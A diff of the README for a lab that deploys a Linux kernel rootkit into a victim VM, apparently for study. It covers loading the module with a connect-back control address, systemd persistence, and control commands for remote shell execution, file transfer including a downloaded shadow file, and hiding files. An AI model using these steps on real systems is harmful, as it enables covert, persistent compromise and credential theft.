@@ -62,23 +62,19 @@ cd wlkom-lapsus/
 # 2. (Optional) edit .env to change IPs, ports, or credentials
 cat scripts/.env
 
-# 3. First-time setup — run as your normal user (not root)
+# 3. One-time setup (download image, generate SSH keys, create disks)
 bash init.sh
 
-# 4. Start the attacker VM FIRST (it opens the socket the victim connects to)
-bash vms/start_vm.sh attacker   # Terminal 1
-
-# 5. Start the victim VM
-bash vms/start_vm.sh victim     # Terminal 2
-# Cloud-init configures each VM on first boot (~2 min). Subsequent boots are instant.
-
-# 6. Deploy: compile + transfer + load the rootkit
+# 4. Full deploy (starts VMs, waits for cloud-init, compiles + loads rootkit)
 bash vms/deploy.sh
 
-# 7. Launch the control server on the attacker VM
+# 5. Launch the control server on the attacker VM
 ssh -i vms/wlkom_key wlkom@localhost -p 2222
 cd ~/attacking_program && ./wlkom_control 4444
 # Password: wlk0m_s3cr3t
+
+# 6. (Development) Iterate faster: change code, then
+bash vms/deploy.sh code     # Recompile without restarting VMs
 ```
 
 ---
@@ -104,58 +100,68 @@ CPUS=2                        # vCPUs per VM
 
 ## Step-by-step
 
-### Step 1 — `bash init.sh`
+### Step 1 — `bash init.sh` (one-time setup)
 
-Run once on the host. It:
+Run this once on the host. It:
 
 1. Checks that KVM is available (`/dev/kvm`)
 2. Installs QEMU, `genisoimage`, `wget` if missing
 3. Generates an ED25519 SSH key pair at `vms/wlkom_key` + `vms/wlkom_key.pub`
-4. Downloads the Debian 12 genericcloud base image (~300 MB, shared by both VMs)
-5. Creates `attacker.qcow2` and `victim.qcow2` as copy-on-write overlays
-6. Builds seed ISOs from the templates in `scripts/cloud-init/`, substituting
-   values from `.env` and the SSH public key
+4. Downloads the Debian 12 genericcloud base image to `temp/` (~300 MB, shared & reused)
+5. Creates `attacker.qcow2` and `victim.qcow2` as copy-on-write overlays in `vms/`
+6. Builds cloud-init seed ISOs from templates, substituting `.env` values and SSH keys
 
-After this step, `vms/` contains everything needed to start the VMs.
+After this step, the project is ready. You only run this **once**.
 
-### Step 2 — Start the VMs
+### Step 2 — `bash vms/deploy.sh` (automated deployment)
 
-**Always start the attacker first** — it opens a QEMU socket that the victim
-connects to. Starting the victim first causes it to fail with "connection refused".
+Two deployment modes:
 
-```bash
-bash vms/start_vm.sh attacker   # Terminal 1 — wait for the QEMU window to appear
-bash vms/start_vm.sh victim     # Terminal 2
-```
-
-On **first boot**, cloud-init configures each VM (~2 min): creates the user, sets
-the password, installs packages, configures `ens4` with a static IP. On
-subsequent boots this is skipped.
-
-SSH access from the host:
-
-```bash
-ssh -i vms/wlkom_key wlkom@localhost -p 2222   # Attacker
-ssh -i vms/wlkom_key wlkom@localhost -p 2223   # Victim
-```
-
-### Step 3 — `bash vms/deploy.sh`
-
-With both VMs running and SSH reachable:
+#### Full deployment (default)
 
 ```bash
 bash vms/deploy.sh
 ```
 
-It:
+Or explicitly:
 
-1. Waits for SSH to be reachable on both VMs
-2. Copies and compiles `attacking_program/` on the attacker VM
-3. Copies and compiles `rootkit/` on the victim VM
-4. Loads the module: `sudo insmod wlkom.ko control_ip=... control_port=...`
-5. The rootkit installs its own persistence on load (systemd service)
+```bash
+bash vms/deploy.sh full
+```
 
-### Step 4 — Use the control server
+Performs **all steps**:
+
+1. **Kills** any running VMs
+2. **Starts** the attacker VM first (opens the socket), then the victim VM
+3. **Waits** for SSH to be reachable on both VMs
+4. **Waits** for cloud-init to finish (~2 min on first boot, instant on re-runs)
+5. **Compiles** `attacking_program/` on the attacker VM
+6. **Compiles** `rootkit/` on the victim VM
+7. **Loads** the module with `sudo insmod wlkom.ko control_ip=... control_port=...`
+8. **Installs** persistence (rootkit auto-loads via systemd)
+
+After this step, both VMs are running with the rootkit loaded and waiting for connections.
+
+#### Code-only deployment (faster iteration)
+
+```bash
+bash vms/deploy.sh code
+```
+
+Reuses running VMs and only:
+
+1. **Compiles** `attacking_program/` on the attacker VM
+2. **Compiles** `rootkit/` on the victim VM
+
+**Does not**:
+- Restart VMs
+- Wait for cloud-init
+- Load the rootkit module
+- Setup persistence
+
+**Use this when** developing — change code, run `bash vms/deploy.sh code`, then manually test. Much faster than restarting VMs.
+
+### Step 3 — Launch the control server
 
 On the attacker VM:
 
@@ -179,21 +185,59 @@ The rootkit retries the connection every 5 seconds. Within a few seconds:
 | Command | Description |
 |---|---|
 | `ping` | Check if the rootkit is alive |
-| `exec <cmd>` | Run a shell command on the victim |
+| `exec [cmd]` | Run shell commands: single mode or interactive loop |
 | `upload <local> <remote>` | Send a file from attacker to victim |
 | `download <remote> <local>` | Retrieve a file from victim |
 | `hide_file <name>` | Hide a file/dir from `ls` and `readdir` |
 | `unhide_file <name>` | Restore a hidden file |
 | `hide_line <file> <pattern>` | Filter lines matching pattern in a file |
 | `unhide_line <file> <pattern>` | Remove a line filter |
+| `help` | Show command list |
 | `exit` | Disconnect |
 
 ### Examples
+
+**Single command execution:**
 
 ```
 WLKOM > exec whoami
 root
 
+WLKOM > exec cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+```
+
+**Interactive command loop (type `exec` alone):**
+
+```
+WLKOM > exec
+Entering command mode (type 'exit' to return to main menu)
+
+exec > ls
+bin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var
+
+exec > cat test.txt
+Hello, WLKOM!
+
+exec > echo "append me" >> test.txt
+exec > cat test.txt
+Hello, WLKOM!
+append me
+
+exec > exit
+Returned to main menu
+
+WLKOM > ping
+PONG
+
+WLKOM > exit
+[Disconnected]
+```
+
+**Other commands:**
+
+```
 WLKOM > upload /tmp/tool /tmp/tool
 Upload: OK
 
@@ -202,9 +246,6 @@ Downloaded 1842 bytes -> ./shadow.txt
 
 WLKOM > hide_file wlkom.ko
 hide_file request sent: wlkom.ko
-
-WLKOM > ping
-PONG
 ```
 
 ---
